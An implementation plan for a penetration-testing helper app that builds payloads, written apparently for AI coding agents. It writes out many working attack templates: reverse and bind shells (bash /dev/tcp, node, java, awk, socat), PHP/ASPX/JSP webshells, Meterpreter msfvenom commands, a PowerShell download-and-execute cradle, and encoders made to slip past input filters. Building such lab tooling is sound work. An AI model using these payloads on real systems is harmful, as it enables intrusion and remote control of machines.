# Payloads 2b-C: breadth, toggles and owner control — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Cover every situation the owner meets with reliable payloads (new paste contexts, reverse and bind shells, staged/Meterpreter msfvenom), add owner-set toggles (Callbacks blocked, Filter, Tools), selectable listeners, and block use of a payload built with a stale LHOST/LPORT.

**Architecture:** Payload content and pure logic stay in `src/engines/payloads/` (defs, wrapping, filters, ranking, stale check). UI stays in `src/features/payloads/`. One new persistent table (`payload_builds`, migration 0013) records builds of baked payloads; everything else (toggles, listener picks) is session memory in `usePayloadsStore`, like today's overrides.

**Tech Stack:** React 19 + TypeScript + zustand + TanStack Query, Tauri 2 + Rust (rusqlite), vitest + Testing Library, Playwright visual audit.

**Spec:** `docs/superpowers/specs/2026-11-08-raven-payloads-breadth-design.md` (2b-C). Read it, and §4 of `docs/superpowers/specs/2026-11-07-raven-interpreters-and-payloads-design.md`, before any task.

## Global Constraints

- Every payload names the situation it serves; every payload has a `parts` entry for each meaningful token and **exact-output tests for each context it declares**.
- One-liners come from the owner's Field Manual cards (`~/Documents/Field Manual/02-Cards/Shells-and-Transfers/`: `Reverse-Shells.md`, `Bind-Shells.md`, `Web-Shells.md`, `Listeners.md`, `Payload-Generation-msfvenom.md`). Where a card has the command, use the card's form (its `{SHELL}` is `/bin/sh` for Linux unless the card says bash). Read-only: never edit the vault.
- Fixtures are fully synthetic: IPs 192.0.2.x / 198.51.100.x / 203.0.113.x, names `*.example.test`. Standard test values: `V = { LHOST: "192.0.2.10", LPORT: "443" }`, target IP `198.51.100.20`.
- CSS grid first (flex only for single-line runs), Ink theme tokens, amber `--warn` / `text-warn` for clues and warnings, no red.
- The Arsenal never ranks by host and never imports payload ranking code.
- Raven never flips a toggle itself. A toggle or inference never moves a payload into "Don't fit here": only Wrong OS and Doesn't work in <context> fold. Everything else marks and moves down.
- New ⌥ chords: `⌥B` Callbacks, `⌥F` Filter, `⌥T` Tools, matched by `e.code` (`KeyB`, `KeyF`, `KeyT`) like `altCode` in `usePayloadSession.tsx`. Existing: ⌥L ⌥H ⌥C ⌥O ⌥W ⌥1–⌥6.
- Offline: Raven makes no network calls. (A Kali command the owner runs may fetch a file; its note says so.)
- Any schema change: migration appended to `src-tauri/src/migrations/mod.rs` `MIGRATIONS`; the runner backs up before migrating. Never edit a shipped migration.
- Builders stage only their own files (`git add <paths>`, never `git add -A`); the owner keeps uncommitted edits in the tree. No AI attribution trailers in commits.
- Commands: `npm test` (vitest), `npm run typecheck`, `npm run lint`, `cargo test` in `src-tauri/`, `npm run audit:visual`.

## Plan calls (owner can overrule)

- **Metasploit lock applies to Meterpreter only.** The owner's `Listeners.md` and `Payload-Generation-msfvenom.md` say a raw staged shell with `multi/handler` is unrestricted on the exam; only Meterpreter is limited to one machine. So the staged raw shell (`windows/x64/shell/reverse_tcp`) gets no lock line. This narrows spec §3.6, which put the line on all the new msfvenom payloads.
- **Bind shells use their own port, `{BIND_PORT}`** (a fill field, default `4444`), not the LPORT chip, because LPORT means "your listener". The target is `{TARGET_IP}`, filled from the host's IP (as in the Arsenal's fill).
- **"Failed here before" and "Needs X" become marks** (moved down, still selectable), not folds, so the "inference never folds a reliable" rule holds for every payload.
- **Filter is one chip with a picker** (`Filter: off | base64 | base64 + ${IFS} | hex`, or `off | PowerShell -e` on Windows), not a toggle plus a second picker.
- **The Shell generator tab is renamed "Shell"** (was "Reverse shell"): it now holds bind shells and uploaded files too.
- **Build records only on a build-step copy, or a trigger copy while not stale.** A trigger copied past the "Rebuild first" guard writes nothing, so it stays stale.
- **No host, no record:** without a host, nothing is recorded and nothing is blocked (spec: "which payload, on which host").
- **Full-file PHP reverse shells are made on Kali** by a copy-and-sed command (PentestMonkey from Kali's `webshells` package; Ivan Sincek fetched from its GitHub repo, noted as needing internet on Kali), not embedded in Raven.

## Review Focus

1. **A blank LHOST or LPORT, now or in the record.** Expect no "Rebuild first" block: stale only when both current values are non-empty, both recorded values are non-empty, and either differs. (Test: Task 6 `staleBuild` cases.)
2. **Unresolved placeholders with a filter on.** Expect the filter not to base64/hex-encode `{LHOST}` (that would hide the gap): the unwrapped text and the "Set … first" note, as `buildPayload` does today. (Test: Task 5.)
3. **Every toggle combination, OS unknown.** Expect every reliable that declares the chosen context to stay in `fits`, never `misfits`, and binds of both OSes first when callbacks are blocked. (Test: Task 5, loop over all toggle combinations.)
4. **The context or payload changes under a stored pick.** Filter set to base64, then context → Bash prompt: filter not applied and its chip hidden; listener pick `socat-tty` stored for one payload never leaks to another, and a pick not in the payload's `listeners` falls back to its first. (Tests: Task 5 build, Task 7 UI.)
5. **An upload path typed with slashes** (`/uploads/`, `uploads/`, ` /var/www/up/ `). Expect the trigger URL to have exactly one slash at each join: `http://198.51.100.20/uploads/shell.php?cmd=whoami`. (Test: Task 2.)

---

### Task 0: Do-first fixes (copy guard repeat key + warning, Transfer guard, fixture IPs)

**Files:**
- Modify: `src/features/arsenal/copyGuard.ts`
- Modify: `src/features/generators/TransferGenerator.tsx`
- Modify: `src/test/transferGenerator.test.tsx` (10.10.14.9 → 192.0.2.x), `src/test/engines/interpret/peas.test.ts` (10.10.14.7 → 192.0.2.x)
- Test: `src/test/copyGuard.test.tsx`, `src/test/transferGenerator.test.tsx`

**Interfaces:**
- Produces: `useCopyGuard({ focusToken, focusCred, hostName, repeatKey?: string })` — `repeatKey` defaults to `"↵"`.
- Produces: `attempt(cmd, doCopy, opts?: { warn?: string; warnKey?: string }): Promise<"copied" | "guarded">`. With `warn`, the first press shows `${warn}. Press ${repeatKey} again to copy anyway` (amber, as `hint`), arms on `copyKey(cmd) + "|" + (opts.warnKey ?? warn)`, and copies on the next press with the same key. Unresolved tokens are checked first (existing behaviour); the warning step comes after them.

- [ ] **Step 1: Write failing tests** in `copyGuard.test.tsx`:
  - `hint names the repeat key`: guard with `repeatKey: "⌘↵ or Copy"`, unresolved `{LHOST}` → hint `"{LHOST} not filled. Press ⌘↵ or Copy again to copy anyway"`.
  - `warn holds the first copy back`: no unresolved, `warn: "Metasploit is locked to dc01"` → first `attempt` returns `"guarded"`, hint `"Metasploit is locked to dc01. Press ↵ again to copy anyway"`, doCopy not called; second returns `"copied"`.
  - `a different warnKey re-arms`: arm with warnKey `"a"`, then attempt with warnKey `"b"` → `"guarded"`.
  - In `transferGenerator.test.tsx`: `one guard for Copy and ⌘↵` — with LHOST blank, press the Copy button once (guarded, hint shows `⌘↵ or Copy`), then ⌘↵ copies (not a second "not filled" step).
- [ ] **Step 2:** `npx vitest run src/test/copyGuard.test.tsx src/test/transferGenerator.test.tsx` → FAIL.
- [ ] **Step 3:** Implement in `copyGuard.ts`; in `TransferGenerator.tsx` make the Copy button and ⌘↵ share one `useCopyGuard` instance with `repeatKey: "⌘↵ or Copy"`. Swap the two test files' 10.10.14.x values to 192.0.2.x (keep each test's meaning).
- [ ] **Step 4:** Same vitest command → PASS; `npm test` → all pass.
- [ ] **Step 5:** Tick the two "Do first" items in `docs/superpowers/followups/2026-11-07-raven-2b-payloads.md`. Commit: `fix(payloads): copy guard names its repeat key, takes a warning; one Transfer guard; synthetic IPs`.

---

### Task 1: Engine model — listeners, OS "any", shapes, uploads, derived tokens

**Files:**
- Modify: `src/engines/payloads/types.ts`, `build.ts`, `reverseShells.ts`, `msfvenom.ts`, `upgrade.ts`, `encodePs.ts` (whatever sets `listener`)
- Create: `src/engines/payloads/listeners.ts`, `src/engines/payloads/psScripts.ts`
- Test: `src/test/engines/payloads/build.test.ts`, `src/test/engines/payloads/listeners.test.ts` (new)

**Interfaces:**
- Produces (types.ts):
  ```ts
  export type ListenerId = "penelope" | "rlwrap-nc" | "socat-tty" | "ncat-ssl" | "multi-handler" | "connect-nc" | "connect-socat" | "connect-penelope";
  export type ToolId = "bash" | "python3" | "perl" | "nc" | "nc-e" | "socat" | "powershell" | "curl" | "wget";
  PayloadDef.os: "linux" | "windows" | "any";
  PayloadDef.requires: (ToolId | "php" | "awk" | "busybox" | "served-file")[];
  PayloadDef.listeners: ListenerId[];      // replaces `listener`; first is the default; [] = none
  PayloadDef.shape?: "bind" | "webshell"; // absent = reverse (needs a callback); only the shell/msfvenom generators use it
  PayloadDef.upload?: { trigger: string; kali?: boolean }; // trigger template, e.g. "http://{TARGET_IP}/{UPLOAD_PATH}/{FILE}?cmd=whoami"; kali: the template is Kali commands that write {FILE}
  PayloadDef.msfPayload?: string;         // the -p value; the multi-handler listener sets it
  PayloadDef.meterpreter?: boolean;       // the Metasploit lock applies (Task 4)
  BuiltPayload.listener: string | null;
  BuiltPayload.listenerId: ListenerId | null;
  BuiltPayload.listenerHeading: "Listener" | "Connect from Kali";
  BuiltPayload.trigger: { text: string; unresolved: string[] } | null;
  ```
- Produces (listeners.ts): `LISTENERS: Record<ListenerId, { label: string; template: string; connect?: boolean; note?: string }>` and `buildListener(id: ListenerId, values: Record<string,string>): string`. Templates (from `Listeners.md` / `Bind-Shells.md`):
  - `penelope`: `penelope -O -p {LPORT}` (note: `No penelope? rlwrap nc -lvnp {LPORT}`)
  - `rlwrap-nc`: `rlwrap nc -lvnp {LPORT}`
  - `socat-tty`: ``socat file:`tty`,raw,echo=0 tcp-listen:{LPORT}`` (note: run `reset` if your terminal misbehaves after exit)
  - `ncat-ssl`: `ncat --ssl -lvnp {LPORT}`
  - `multi-handler`: `msfconsole -q -x "use exploit/multi/handler; set payload {MSF_PAYLOAD}; set LHOST {LHOST}; set LPORT {LPORT}; set ExitOnSession false; run -j"`
  - `connect-nc`: `rlwrap nc -nv {TARGET_IP} {BIND_PORT}` (connect)
  - `connect-socat`: ``socat file:`tty`,raw,echo=0 tcp:{TARGET_IP}:{BIND_PORT}`` (connect)
  - `connect-penelope`: `penelope -O -c {TARGET_IP} -p {BIND_PORT}` (connect)
- Produces (build.ts): `buildPayload(def, ctx, values, opts?: { os?: "linux" | "windows"; listener?: ListenerId; filter?: FilterId }): BuiltPayload`. `opts.os` is used to wrap a `def.os === "any"` payload (default `"linux"`). `opts.listener` is used only when it is in `def.listeners`; otherwise `def.listeners[0]`. (`FilterId` arrives in Task 5; add the parameter then.)
- Produces: derived token `PS_B64` (add to `DERIVED_TOKENS`): the UTF-16LE base64 of `POWERSHELL_TCP` (moved to `psScripts.ts`) filled with LHOST/LPORT. When either is unresolved, `{PS_B64}` stays in the text and LHOST/LPORT are listed as unresolved.
- Produces: `TARGET_IP` and `BIND_PORT` are ordinary placeholders (fill fields); `UPLOAD_PATH` too. `buildPayload` trims `/` and whitespace from both ends of `UPLOAD_PATH` before filling.

- [ ] **Step 1: Failing tests.**
  - `listeners.test.ts`: `buildListener` exact output for every id with `{ LHOST: "192.0.2.10", LPORT: "443", TARGET_IP: "198.51.100.20", BIND_PORT: "4444", MSF_PAYLOAD: "windows/x64/meterpreter/reverse_tcp" }`, e.g. `multi-handler` → `msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.0.2.10; set LPORT 443; set ExitOnSession false; run -j"`.
  - `build.test.ts`: `existing catalogue builds unchanged` — for every def in `REVERSE_SHELLS`, `MSFVENOM`, `UPGRADE`, `text` and `prepare` equal what they were before the refactor for each declared context with `V` (capture the expected strings from `main` before editing; commit them as literals). `listener` is `penelope -O -p 443` for every reverse shell (default listener). `opts.listener: "rlwrap-nc"` on `bash-tcp` → `rlwrap nc -lvnp 443`; `opts.listener: "ncat-ssl"` (not in its list) → penelope. `listenerHeading` is `"Listener"` for reverse.
  - `PS_B64 fills once LHOST and LPORT are set` (def with template `x {PS_B64}` → `x ` + `utf16leBase64(POWERSHELL_TCP filled)`); with LHOST blank → text contains `{PS_B64}` and `unresolved` contains `LHOST`.
  - `any-OS def wraps for opts.os`: a def `os: "any"`, contexts `["php-system"]` → wraps with `bash -c` when `opts.os` is linux, not when windows.
- [ ] **Step 2:** `npx vitest run src/test/engines/payloads` → FAIL.
- [ ] **Step 3:** Implement. Existing defs: `listener: "penelope"` → `listeners: ["penelope", "rlwrap-nc"]`; `listener: "none"` → `listeners: []`. msfvenom defs set `msfPayload`. Drop the `FALLBACK_LISTENER` note in favour of the `penelope` listener note. Keep `fit.ts` compiling (`d.os !== s.os` must treat `"any"` as matching — a one-line change; full ranking work is Task 5).
- [ ] **Step 4:** `npx vitest run src/test/engines/payloads && npm run typecheck` → PASS. Fix any UI type errors from `listener` → `listeners` minimally (the UI already reads `built.listener`).
- [ ] **Step 5:** Commit: `refactor(payloads): listener choices, any-OS defs, shapes and derived PS_B64`.

---

### Task 2: New paste contexts, uploaded-file and code shells

**Files:**
- Modify: `src/engines/payloads/context.ts`
- Create: `src/engines/payloads/uploadShells.ts`, `src/engines/payloads/codeShells.ts`, `src/engines/payloads/shells.ts`
- Test: `src/test/engines/payloads/uploadShells.test.ts`, `src/test/engines/payloads/codeShells.test.ts`

**Interfaces:**
- Consumes: Task 1 types, `buildPayload`, `PS_B64`.
- Produces: `PasteContext` gains `"uploaded-file" | "groovy" | "node" | "java"`; `PASTE_CONTEXTS` entries `{ id: "uploaded-file", label: "Uploaded file", os: "any" }`, `{ id: "groovy", label: "Jenkins / Groovy console", os: "any" }`, `{ id: "node", label: "Node code", os: "any" }`, `{ id: "java", label: "Java code", os: "any" }`. Their wrappers return the text unchanged, with notes: "Saved as a file and uploaded; nothing is wrapped." / "Pasted into the Groovy console as-is." / "Runs as Node code (RCE or SSTI in a Node template)." / "Runs as Java (deserialisation or expression-language RCE).".
- Produces: `UPLOAD_SHELLS: PayloadDef[]`, `CODE_SHELLS: PayloadDef[]`, and in `shells.ts` `SHELLS = [...REVERSE_SHELLS, ...BIND_SHELLS, ...UPLOAD_SHELLS, ...CODE_SHELLS]` (`BIND_SHELLS` from Task 3; export an empty array stub from `bindShells.ts` now so `shells.ts` compiles).
- Uploaded-file defs (all `contexts: ["uploaded-file"]`, `generator: "shell"`):
  - `upload-php-cmd` (os any, shape webshell, `requires: ["php"]`, listeners []): `<?php system($_REQUEST['cmd']); ?>`, FILE default `shell.php`, trigger `http://{TARGET_IP}/{UPLOAD_PATH}/{FILE}?cmd=whoami`. Note the card's fallbacks (`shell_exec`, `passthru`).
  - `upload-aspx-cmd` (windows, webshell): the ASPX one-liner from `Web-Shells.md`, FILE `shell.aspx`, same trigger shape.
  - `upload-jsp-cmd-linux` / `upload-jsp-cmd-windows` (webshell): the JSP from `Web-Shells.md` with `"/bin/sh","-c"` / `"cmd.exe","/c"`, FILE `shell.jsp`.
  - `upload-php-pentestmonkey` (linux, reverse, `bakesIp`, `upload.kali: true`, listeners `["penelope","rlwrap-nc"]`): template
    `cp /usr/share/webshells/php/php-reverse-shell.php {FILE} && sed -i "s/^\$ip = .*/\$ip = '{LHOST}';/; s/^\$port = .*/\$port = {LPORT};/" {FILE}`, FILE `rev.php`, trigger `http://{TARGET_IP}/{UPLOAD_PATH}/{FILE}`. Builder: confirm the two `$ip`/`$port` lines of that file start at column 0 (they do in the upstream file); if not, adjust the regex and say so in the report.
  - `upload-php-ivan-sincek` (os any, reverse, `bakesIp`, `upload.kali: true`): template fetches `php_reverse_shell.php` from `https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php` with `curl -so {FILE}` then `sed -i` replaces the `new Shell('…', …)` call with `new Shell('{LHOST}', {LPORT})`. Builder: WebFetch the file and confirm the exact default call before writing the regex; if you can't fetch it, stop and report. Note: "Needs internet on Kali; keep a copy in your tools folder for offline labs. Works on Windows and Linux PHP."
- Code-shell defs (one per OS each, from `Reverse-Shells.md` "Java / Groovy" where present):
  - `groovy-linux` / `groovy-windows` (`contexts: ["groovy"]`, `requires: []`): the card's Groovy ProcessBuilder shell; `cmd` is `/bin/bash` or `cmd.exe`.
  - `node-linux` / `node-windows` (`contexts: ["node"]`): `(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect({LPORT},"{LHOST}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();` with `"cmd.exe"` for Windows.
  - `java-linux` (`contexts: ["java"]`): the card's `Runtime.getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"})` form.
  - `java-windows`: `Runtime.getRuntime().exec("powershell -nop -w hidden -e {PS_B64}")`.
- Every def has parts for its key tokens and a one-line note saying where it is used.

- [ ] **Step 1: Failing tests.** For every def in `UPLOAD_SHELLS` and `CODE_SHELLS`, for each declared context: exact `text` with `V`, `TARGET_IP: "198.51.100.20"`, `UPLOAD_PATH: "uploads"` (write each expected string out literally). Plus:
  - `trigger joins the upload path with single slashes`: `UPLOAD_PATH` of `"/uploads/"`, `"uploads/"`, `" /var/www/up/ "` → `http://198.51.100.20/uploads/shell.php?cmd=whoami`, `…/uploads/…`, `http://198.51.100.20/var/www/up/shell.php?cmd=whoami`.
  - `UPLOAD_PATH blank is unresolved in the trigger only`: payload `unresolved` is `[]`, `trigger.unresolved` is `["UPLOAD_PATH"]`.
  - `every def has parts and a note`, `every part token appears in its built text` (for one context each).
- [ ] **Step 2:** `npx vitest run src/test/engines/payloads` → FAIL.
- [ ] **Step 3:** Implement. `buildPayload` fills `def.upload.trigger` into `trigger` with its own unresolved list.
- [ ] **Step 4:** Same command → PASS; `npm run typecheck`.
- [ ] **Step 5:** Commit: `feat(payloads): uploaded file, Groovy, Node and Java contexts with their shells`.

---

### Task 3: New reverse shells and bind shells

**Files:**
- Modify: `src/engines/payloads/reverseShells.ts`
- Create/fill: `src/engines/payloads/bindShells.ts`
- Test: `src/test/engines/payloads/reverseShells.test.ts`, `src/test/engines/payloads/bindShells.test.ts`

**Interfaces:**
- Consumes: Task 1–2.
- Produces: new `REVERSE_SHELLS` entries, appended after the reliables (order of the reliables unchanged):
  - `perl` (linux, ALL_LINUX contexts, `requires: ["perl"]`): the card's perl line with `/bin/sh`.
  - `socat-tty` (linux, ALL_LINUX, `requires: ["socat"]`, listeners `["socat-tty", "rlwrap-nc"]`): `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}`. Note: needs socat on the target, or a static binary transferred first.
  - `busybox-nc` (linux, ALL_LINUX, `requires: ["busybox"]`): `busybox nc {LHOST} {LPORT} -e /bin/sh`.
  - `awk` (linux, ALL_LINUX, `requires: ["awk"]`): `awk 'BEGIN{s="/inet/tcp/0/{LHOST}/{LPORT}";while(1){printf "> " |& s;s |& getline c;if(c){while((c |& getline) > 0)print $0 |& s;close(c)}}}'`. Note: needs gawk (`/inet/tcp` is a gawk feature; mawk has none).
  - `conptyshell` (windows, `contexts: ["powershell"]`, `requires: ["powershell", "served-file"]`, listeners `["socat-tty"]`, `serve: SERVE`): prepare `curl -sO https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1`; template `IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}{WEB_PORT}/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell -RemoteIp {LHOST} -RemotePort {LPORT} -Rows {ROWS} -Cols {COLS}`, defaults ROWS 40, COLS 160. Notes: the `stty raw -echo; (stty size; cat) | nc -lvnp {LPORT}` alternative listener; prepare needs internet on Kali.
  - `ps-tls` (windows, contexts as `ps-b64`, `requires: ["powershell"]`, `encodePowerShell: true`, listeners `["ncat-ssl"]`): a `System.Net.Security.SslStream` client over `TcpClient("{LHOST}",{LPORT})` that accepts any certificate, with the same read/iex/write loop as `POWERSHELL_TCP` (put the script in `psScripts.ts` as `POWERSHELL_TLS`). Notes: pairs with `ncat --ssl` or `openssl s_server -quiet -key key.pem -cert cert.pem -port {LPORT}`.
- Produces: `BIND_SHELLS` (all `shape: "bind"`, no `bakesIp`, listeners `["connect-nc", "connect-penelope"]` unless stated, `defaults: { BIND_PORT: "4444" }`), from `Bind-Shells.md`:
  - `bind-mkfifo-nc` (linux, ALL_LINUX, `requires: ["nc"]`): `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp {BIND_PORT} > /tmp/f` (note: some OpenBSD builds want `nc -l {BIND_PORT}`).
  - `bind-socat` (linux, ALL_LINUX, `requires: ["socat"]`, listeners `["connect-socat", "connect-nc"]`): `socat TCP-LISTEN:{BIND_PORT},reuseaddr,fork EXEC:'bash -li',pty,stderr,setsid,sigint,sane`.
  - `bind-python3` (linux, ALL_LINUX, `requires: ["python3"]`): the card's python3 bind with `/bin/bash`.
  - `bind-nc-exe` (windows, contexts as `nc-exe`, `requires: ["nc-e"]`, FILE default as `nc-exe`): `{FILE} -lvnp {BIND_PORT} -e cmd.exe` (same build note as `nc-exe`).
  - `bind-ps` (windows, `contexts: ["cmd", "webshell-param", "url-param"]`, `requires: ["powershell"]`): the card's `TcpListener` one-liner. Note: from a PowerShell prompt, base64 it first; the Windows firewall may need the card's `netsh` rule (admin).
- Bind-shell `listenerHeading` is `"Connect from Kali"` (Task 1 sets it from `LISTENERS[id].connect`).

- [ ] **Step 1: Failing tests.** Exact `text` for every new def in every declared context with `V`, `TARGET_IP: "198.51.100.20"`, default `BIND_PORT`; exact `listener` (e.g. `bind-mkfifo-nc` → `rlwrap nc -nv 198.51.100.20 4444`, heading `"Connect from Kali"`; `ps-tls` → `ncat --ssl -lvnp 443`; `socat-tty` → ``socat file:`tty`,raw,echo=0 tcp-listen:443``); exact `prepare` for `conptyshell` (with SERVE line, and `8000` when LPORT is 80). Plus `every def has parts and notes` and `part tokens appear in the built text`.
- [ ] **Step 2:** `npx vitest run src/test/engines/payloads` → FAIL.
- [ ] **Step 3:** Implement.
- [ ] **Step 4:** Same → PASS; typecheck.
- [ ] **Step 5:** Commit: `feat(payloads): perl, socat, busybox, awk, ConPtyShell and TLS reverse shells; bind shells`.

---

### Task 4: msfvenom staged and Meterpreter; exam rule moves to the Metasploit lock

**Files:**
- Modify: `src/engines/payloads/msfvenom.ts`, `src/engines/payloads/fit.ts` (remove `EXAM_BANNED`, `bannedInExam`, the "Not allowed in the exam" reason)
- Create: `src/engines/payloads/msfLock.ts`
- Modify: `docs/superpowers/specs/2026-11-07-raven-interpreters-and-payloads-design.md` (lines 168, 230, 250: exam rules), and the spec 2b-C §3.6 with the Meterpreter-only plan call
- Test: `src/test/engines/payloads/others.test.ts` (msfvenom section), `src/test/engines/payloads/msfLock.test.ts`, `src/test/engines/payloads/fit.test.ts`

**Interfaces:**
- Produces new `MSFVENOM` defs (listeners `["multi-handler"]`, `msfPayload` set, `bakesIp`):
  - `msf-win-x64-met-staged` `windows/x64/meterpreter/reverse_tcp` exe `met.exe` (`meterpreter: true`)
  - `msf-win-x64-met-stageless` `windows/x64/meterpreter_reverse_tcp` exe `met.exe` (`meterpreter: true`)
  - `msf-win-x64-shell-staged` `windows/x64/shell/reverse_tcp` exe `rev-staged.exe` (no lock: raw shell)
  - `msf-linux-x64-met-staged` `linux/x64/meterpreter/reverse_tcp` elf `met.elf` (`meterpreter: true`)
  - `msf-linux-x64-met-stageless` `linux/x64/meterpreter_reverse_tcp` elf `met.elf` (`meterpreter: true`)
  - `msf-php-met` `php/meterpreter/reverse_tcp` raw `met.php`, os `"any"` (`meterpreter: true`)
- The `-p` part's explanation states staged vs stageless for each payload name (the existing text claims "underscore means stageless"; meterpreter_reverse_tcp is stageless and meterpreter/reverse_tcp staged — write both correctly). Existing stageless defs gain `"multi-handler"` as a second listener choice. The file header comment drops the "(exam rule)" sentence. Notes on new defs: "Catch it with multi/handler: nc and penelope can't serve a stage or speak Meterpreter."
- Produces (msfLock.ts): `msfLockLine(input: { exam: boolean; def: PayloadDef; hostId: string | null; msfHostId: string | null; hostName: (id: string) => string }): string | null` → `null` unless `exam && def.meterpreter`; then `null` when `msfHostId === hostId`, `"Lock Metasploit to this host first"` when `msfHostId` is null, else `` `Metasploit is locked to ${hostName(msfHostId)}` ``.

- [ ] **Step 1: Failing tests.**
  - Exact `text` and `listener` for each new def with `V` (e.g. `msf-win-x64-met-staged` → `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.0.2.10 LPORT=443 -f exe -o met.exe`, listener `msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.0.2.10; set LPORT 443; set ExitOnSession false; run -j"`).
  - `fit.test.ts`: `exam never folds a payload` — `rankPayloads(MSFVENOM, {…exam: true, os: "windows"}, null)` has every Windows and any-OS def in `fits`; no reason equals `"Not allowed in the exam"` anywhere (grep the source too: `expect(src).not.toContain("Not allowed in the exam")` reading `fit.ts`).
  - `msfLock.test.ts`: the four cases (not exam → null; raw staged shell in exam → null; locked to this host → null; no lock → "Lock Metasploit to this host first"; locked to another → "Metasploit is locked to dc01").
- [ ] **Step 2:** Run those files → FAIL.
- [ ] **Step 3:** Implement; edit both spec docs' exam lines to: "No payload is banned; Metasploit (Meterpreter) is limited to one machine, tracked by the Metasploit lock. msfvenom and multi/handler with raw shells are unrestricted."
- [ ] **Step 4:** Run → PASS; `npm test`.
- [ ] **Step 5:** Commit: `feat(payloads): staged and Meterpreter msfvenom with multi/handler; exam limit via the Metasploit lock`.

---

### Task 5: Ranking with marks, toggles, tools and filter wrappers (engine)

**Files:**
- Modify: `src/engines/payloads/fit.ts`, `src/engines/payloads/build.ts`
- Create: `src/engines/payloads/filters.ts`
- Test: `src/test/engines/payloads/fit.test.ts`, `src/test/engines/payloads/filters.test.ts`

**Interfaces:**
- Produces (fit.ts):
  ```ts
  export interface Toggles { callbacksBlocked: boolean; tools: Partial<Record<ToolId, "present" | "missing">> }
  export const TOOL_LABEL: Record<ToolId, string>; // bash, python3, perl, nc, "nc with -e", socat, PowerShell, curl, wget
  export function inferredTools(s: PayloadSituation): Partial<Record<ToolId, "present" | "missing">>; // from s.tools; "nc.exe" → nc-e, others by name
  export function rankPayloads(defs, s, ctx, toggles?: Toggles): { fits: PayloadDef[]; marks: Record<string, string[]>; misfits: { def: PayloadDef; reason: string }[] };
  export function callbackClue(s: PayloadSituation, defs: PayloadDef[]): string | null;
  ```
  - Misfits only: `Wrong OS (…)` (a def with `os: "any"` never) and `Doesn't work in <label>`.
  - Marks (strings, in this order): `"Needs a callback"` (reverse shape, only when `callbacksBlocked`), `"Needs ${label}"` for each required tool that is `missing` in the merged tools (owner ticks win over `inferredTools`; php from inference only), `"Failed here before"`.
  - Order: with `callbacksBlocked`, binds first; then unmarked defs (service-preferred first, as today); then marked defs, in catalogue order.
  - `callbackClue`: count of reverse-shape ids in `s.failedPayloadIds` that are in `defs`; ≥2 → `"Callbacks failed here twice"` (2) or `` `Callbacks failed here ${n} times` `` (3+); else null.
- Produces (filters.ts):
  ```ts
  export type FilterId = "off" | "b64" | "ifs" | "hex" | "ps-b64";
  export const FILTER_CONTEXTS: PasteContext[] = ["injected-linux", "url-param", "webshell-param"];
  export function filterChoices(os: "linux" | "windows" | null): FilterId[]; // linux: off,b64,ifs,hex; windows: off,ps-b64; null: all
  export function applyFilter(raw: string, f: Exclude<FilterId, "off">): { text: string; parts: PayloadPart[]; note: string };
  ```
  - `b64`: `echo <base64 utf8 of raw>|base64 -d|bash` — parts say it avoids quotes, `;`, `&`, `>`, `/`.
  - `ifs`: the b64 form with every space → `${IFS}` (`echo${IFS}<b64>|base64${IFS}-d|bash`) — avoids spaces too.
  - `hex`: `bash -c $'\x..\x..'` of every byte of raw — note: the injecting shell must understand `$'…'` (bash, zsh, recent dash); if nothing happens use base64.
  - `ps-b64`: `powershell -nop -w hidden -e <utf16le b64 of raw>`; for a def that already has `encodePowerShell`, unchanged with a note "Already base64 (-e).".
- `buildPayload(..., opts.filter)` applies the filter to the filled raw text **instead of** the context's `bash -c` step, then URL-encodes for `url-param`/`webshell-param` (as `urlEncodeShell` does), only when: `ctx` is in `FILTER_CONTEXTS`, the filter fits `def.os` (`ps-b64` Windows only, the rest Linux only), and nothing is unresolved. Otherwise the filter is ignored and no filter note is added. Filter parts are appended to the def's parts.

- [ ] **Step 1: Failing tests** (`fit.test.ts`, `filters.test.ts`):
  - `reliables never fold`: for `RELIABLE = ["bash-tcp","mkfifo-nc","mkfifo-nc-bg","python3","php-exec","ps-b64","powercat-cradle","nishang-cradle","nc-exe"]`, loop over os ∈ {linux, windows, null}, every context, `callbacksBlocked` ∈ {true,false}, tools all-missing / none, and failedPayloadIds = all reliables: every reliable whose `os` matches (or os null) and that declares the context (or ctx null) is in `fits`.
  - `callbacks blocked puts binds first and marks reverses`: Linux, `bash-prompt`, blocked → `fits[0..n]` are the Linux bind ids in catalogue order; `marks["bash-tcp"]` equals `["Needs a callback"]`; upload/webshell defs not marked.
  - `owner tick beats inference`: situation absent `python3`, toggles `{python3: "present"}` → no mark on `python3`; toggles `{perl: "missing"}` → `marks.perl` is `["Needs perl"]`, and it sorts after all unmarked defs.
  - `callbackClue`: 1 failed reverse → null; 2 → "Callbacks failed here twice"; a failed bind doesn't count.
  - Filters: `applyFilter("id", "b64")` → `echo aWQ=|base64 -d|bash`; `"ifs"` → `echo${IFS}aWQ=|base64${IFS}-d|bash`; `"hex"` → `bash -c $'\x69\x64'`; `buildPayload(bash-tcp, "url-param", V, {filter: "b64"})` exact (b64 form, then URL-encoded); `bash-prompt` with filter b64 → identical to unfiltered; LHOST blank with filter b64 → unfiltered text with `{LHOST}` and the "Set LHOST first" note; `nc-exe` in `webshell-param` with `ps-b64` → `powershell -nop -w hidden -e …` URL-encoded; `ps-b64` def with `ps-b64` filter → unchanged plus the "Already base64" note.
- [ ] **Step 2:** Run → FAIL.
